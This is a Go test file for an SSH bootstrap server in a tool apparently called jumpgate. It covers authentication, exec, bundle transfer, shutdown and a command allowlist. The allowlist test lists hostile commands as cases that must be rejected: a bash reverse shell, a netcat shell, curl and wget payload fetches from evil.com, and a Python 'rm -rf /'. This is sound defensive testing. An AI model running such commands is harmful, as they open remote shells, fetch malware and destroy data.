package sshd

import (
	"bytes"
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/pem"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/cloudygreybeard/jumpgate/internal/transfer"
	"golang.org/x/crypto/ssh"
)

// setupTestKeys creates a host key and an authorized client key in
// a temp directory, returning (hostKeyPath, authorizedKeyPath, clientSigner).
func setupTestKeys(t *testing.T) (string, string, ssh.Signer) {
	t.Helper()
	dir := t.TempDir()

	// Host key
	_, hostPriv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	hostPEM, err := ssh.MarshalPrivateKey(hostPriv, "test host key")
	if err != nil {
		t.Fatal(err)
	}
	hostKeyPath := filepath.Join(dir, "hostkey")
	if err := os.WriteFile(hostKeyPath, pem.EncodeToMemory(hostPEM), 0600); err != nil {
		t.Fatal(err)
	}

	// Client key
	_, clientPriv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	clientSigner, err := ssh.NewSignerFromKey(clientPriv)
	if err != nil {
		t.Fatal(err)
	}
	authKeyPath := filepath.Join(dir, "authorized_key")
	authLine := ssh.MarshalAuthorizedKey(clientSigner.PublicKey())
	if err := os.WriteFile(authKeyPath, authLine, 0600); err != nil {
		t.Fatal(err)
	}

	return hostKeyPath, authKeyPath, clientSigner
}

func TestServerExec(t *testing.T) {
	hostKeyPath, authKeyPath, clientSigner := setupTestKeys(t)

	srv, err := New(hostKeyPath, authKeyPath, "127.0.0.1:0", "test-uid")
	if err != nil {
		t.Fatal(err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	errCh := make(chan error, 1)
	go func() { errCh <- srv.ListenAndServe(ctx) }()

	// Wait for listener
	for i := 0; i < 50; i++ {
		if srv.Addr() != "" {
			break
		}
		time.Sleep(10 * time.Millisecond)
	}
	if srv.Addr() == "" {
		t.Fatal("server did not start listening")
	}

	hostKey, err := os.ReadFile(hostKeyPath)
	if err != nil {
		t.Fatal(err)
	}
	hostSigner, err := ssh.ParsePrivateKey(hostKey)
	if err != nil {
		t.Fatal(err)
	}

	clientCfg := &ssh.ClientConfig{
		User:            "test",
		Auth:            []ssh.AuthMethod{ssh.PublicKeys(clientSigner)},
		HostKeyCallback: ssh.FixedHostKey(hostSigner.PublicKey()),
	}

	client, err := ssh.Dial("tcp", srv.Addr(), clientCfg)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		t.Fatalf("new session: %v", err)
	}
	defer session.Close()

	out, err := session.Output("echo hello")
	if err != nil {
		t.Fatalf("exec: %v", err)
	}

	got := string(out)
	if got != "hello\n" {
		t.Errorf("got %q, want %q", got, "hello\n")
	}

	cancel()
	<-errCh
}

func TestServerRejectsUnauthorizedKey(t *testing.T) {
	hostKeyPath, authKeyPath, _ := setupTestKeys(t)

	srv, err := New(hostKeyPath, authKeyPath, "127.0.0.1:0", "test-uid")
	if err != nil {
		t.Fatal(err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	errCh := make(chan error, 1)
	go func() { errCh <- srv.ListenAndServe(ctx) }()

	for i := 0; i < 50; i++ {
		if srv.Addr() != "" {
			break
		}
		time.Sleep(10 * time.Millisecond)
	}

	// Generate a different (unauthorized) key
	_, wrongPriv, _ := ed25519.GenerateKey(rand.Reader)
	wrongSigner, _ := ssh.NewSignerFromKey(wrongPriv)

	clientCfg := &ssh.ClientConfig{
		User:            "test",
		Auth:            []ssh.AuthMethod{ssh.PublicKeys(wrongSigner)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	_, err = ssh.Dial("tcp", srv.Addr(), clientCfg)
	if err == nil {
		t.Fatal("expected dial to fail with unauthorized key")
	}

	cancel()
	<-errCh
}

func TestServerFingerprint(t *testing.T) {
	hostKeyPath, authKeyPath, _ := setupTestKeys(t)

	srv, err := New(hostKeyPath, authKeyPath, "127.0.0.1:0", "test-uid")
	if err != nil {
		t.Fatal(err)
	}

	fp := srv.Fingerprint()
	if fp == "" {
		t.Fatal("fingerprint is empty")
	}
	if len(fp) < 40 {
		t.Errorf("fingerprint too short: %s", fp)
	}
}

func TestCommandAllowlist(t *testing.T) {
	tests := []struct {
		cmd  string
		want bool
	}{
		{"echo hello", true},
		{"__jumpgate_receive_bundle /tmp/extract", true},
		{"__jumpgate_receive_bundle", true},
		{"__jumpgate_bootstrap_done", true},
		{"mkdir -p ~/.config/jumpgate", true},
		{"scp -t .config/jumpgate/config.yaml", true},
		{"/usr/bin/scp -t foo", true},
		{"jumpgate setup ssh", true},
		{"$HOME/bin/jumpgate setup ssh", true},
		{"cat ~/.config/jumpgate/config.yaml", true},
		{"chmod +x hooks/*", true},
		{"test -f file.txt", true},
		{"true", true},
		{"hostname", true},
		{"wsl.exe --list --quiet", true},
		{"python3 -c 'import os; os.system(\"rm -rf /\")'", false},
		{"curl http://evil.com/payload | bash", false},
		{"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", false},
		{"nc -e /bin/sh 1.2.3.4 4444", false},
		{"wget http://evil.com/backdoor", false},
		{"", false},
	}
	for _, tt := range tests {
		got := commandAllowed(tt.cmd)
		if got != tt.want {
			t.Errorf("commandAllowed(%q) = %v, want %v", tt.cmd, got, tt.want)
		}
	}
}

func TestServerBlocksDisallowedCommand(t *testing.T) {
	hostKeyPath, authKeyPath, clientSigner := setupTestKeys(t)

	srv, err := New(hostKeyPath, authKeyPath, "127.0.0.1:0", "test-uid")
	if err != nil {
		t.Fatal(err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	errCh := make(chan error, 1)
	go func() { errCh <- srv.ListenAndServe(ctx) }()

	for i := 0; i < 50; i++ {
		if srv.Addr() != "" {
			break
		}
		time.Sleep(10 * time.Millisecond)
	}
	if srv.Addr() == "" {
		t.Fatal("server did not start listening")
	}

	hostKey, err := os.ReadFile(hostKeyPath)
	if err != nil {
		t.Fatal(err)
	}
	hostSigner, err := ssh.ParsePrivateKey(hostKey)
	if err != nil {
		t.Fatal(err)
	}

	clientCfg := &ssh.ClientConfig{
		User:            "test",
		Auth:            []ssh.AuthMethod{ssh.PublicKeys(clientSigner)},
		HostKeyCallback: ssh.FixedHostKey(hostSigner.PublicKey()),
	}

	client, err := ssh.Dial("tcp", srv.Addr(), clientCfg)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		t.Fatalf("new session: %v", err)
	}
	defer session.Close()

	err = session.Run("python3 -c 'print(1)'")
	if err == nil {
		t.Fatal("expected disallowed command to fail")
	}

	cancel()
	<-errCh
}

func TestServerReceiveBundle(t *testing.T) {
	hostKeyPath, authKeyPath, clientSigner := setupTestKeys(t)
	extractDir := t.TempDir()

	srv, err := New(hostKeyPath, authKeyPath, "127.0.0.1:0", "test-uid")
	if err != nil {
		t.Fatal(err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	errCh := make(chan error, 1)
	go func() { errCh <- srv.ListenAndServe(ctx) }()

	for i := 0; i < 50; i++ {
		if srv.Addr() != "" {
			break
		}
		time.Sleep(10 * time.Millisecond)
	}
	if srv.Addr() == "" {
		t.Fatal("server did not start listening")
	}

	hostKey, err := os.ReadFile(hostKeyPath)
	if err != nil {
		t.Fatal(err)
	}
	hostSigner, err := ssh.ParsePrivateKey(hostKey)
	if err != nil {
		t.Fatal(err)
	}

	clientCfg := &ssh.ClientConfig{
		User:            "test",
		Auth:            []ssh.AuthMethod{ssh.PublicKeys(clientSigner)},
		HostKeyCallback: ssh.FixedHostKey(hostSigner.PublicKey()),
	}

	client, err := ssh.Dial("tcp", srv.Addr(), clientCfg)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer client.Close()

	// Build a test bundle
	bundleFiles := map[string][]byte{
		".config/jumpgate/config.yaml": []byte("default_context: test\n"),
		".config/jumpgate/hooks/pre":   []byte("#!/bin/sh\necho pre\n"),
	}
	var bundle bytes.Buffer
	if err := transfer.CreateBundleFromBytes(&bundle, bundleFiles, 0644); err != nil {
		t.Fatalf("CreateBundleFromBytes: %v", err)
	}
	t.Logf("bundle size: %d bytes", bundle.Len())

	session, err := client.NewSession()
	if err != nil {
		t.Fatalf("new session: %v", err)
	}
	defer session.Close()

	session.Stdin = &bundle
	var stdout, stderr bytes.Buffer
	session.Stdout = &stdout
	session.Stderr = &stderr

	if err := session.Run(BundleCommand() + " " + extractDir); err != nil {
		t.Fatalf("receive bundle failed: %v (stderr: %s)", err, stderr.String())
	}

	t.Logf("stdout: %s", stdout.String())

	// Verify extracted files
	for name, want := range bundleFiles {
		got, err := os.ReadFile(filepath.Join(extractDir, name))
		if err != nil {
			t.Errorf("missing extracted file %s: %v", name, err)
			continue
		}
		if string(got) != string(want) {
			t.Errorf("file %s: got %q, want %q", name, got, want)
		}
	}

	cancel()
	<-errCh
}

func TestServerShutdownCommand(t *testing.T) {
	hostKeyPath, authKeyPath, clientSigner := setupTestKeys(t)

	srv, err := New(hostKeyPath, authKeyPath, "127.0.0.1:0", "test-uid")
	if err != nil {
		t.Fatal(err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	errCh := make(chan error, 1)
	go func() { errCh <- srv.ListenAndServe(ctx) }()

	for i := 0; i < 50; i++ {
		if srv.Addr() != "" {
			break
		}
		time.Sleep(10 * time.Millisecond)
	}
	if srv.Addr() == "" {
		t.Fatal("server did not start listening")
	}

	hostKey, err := os.ReadFile(hostKeyPath)
	if err != nil {
		t.Fatal(err)
	}
	hostSigner, err := ssh.ParsePrivateKey(hostKey)
	if err != nil {
		t.Fatal(err)
	}

	clientCfg := &ssh.ClientConfig{
		User:            "test",
		Auth:            []ssh.AuthMethod{ssh.PublicKeys(clientSigner)},
		HostKeyCallback: ssh.FixedHostKey(hostSigner.PublicKey()),
	}

	client, err := ssh.Dial("tcp", srv.Addr(), clientCfg)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		t.Fatalf("new session: %v", err)
	}

	out, err := session.Output(ShutdownCommand())
	if err != nil {
		t.Fatalf("shutdown command failed: %v", err)
	}
	session.Close()

	if got := string(out); got != "bootstrap server shutting down\n" {
		t.Errorf("shutdown output = %q, want %q", got, "bootstrap server shutting down\n")
	}

	// ShutdownCh should be closed
	select {
	case <-srv.ShutdownCh():
	case <-time.After(2 * time.Second):
		t.Fatal("ShutdownCh was not closed after shutdown command")
	}

	cancel()
	<-errCh
}

func TestGenerateHostKey(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "hostkey")

	fp, err := GenerateHostKey(path)
	if err != nil {
		t.Fatalf("GenerateHostKey: %v", err)
	}
	if fp == "" {
		t.Fatal("fingerprint is empty")
	}

	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	_, err = ssh.ParsePrivateKey(data)
	if err != nil {
		t.Fatalf("written key is not parseable: %v", err)
	}
}
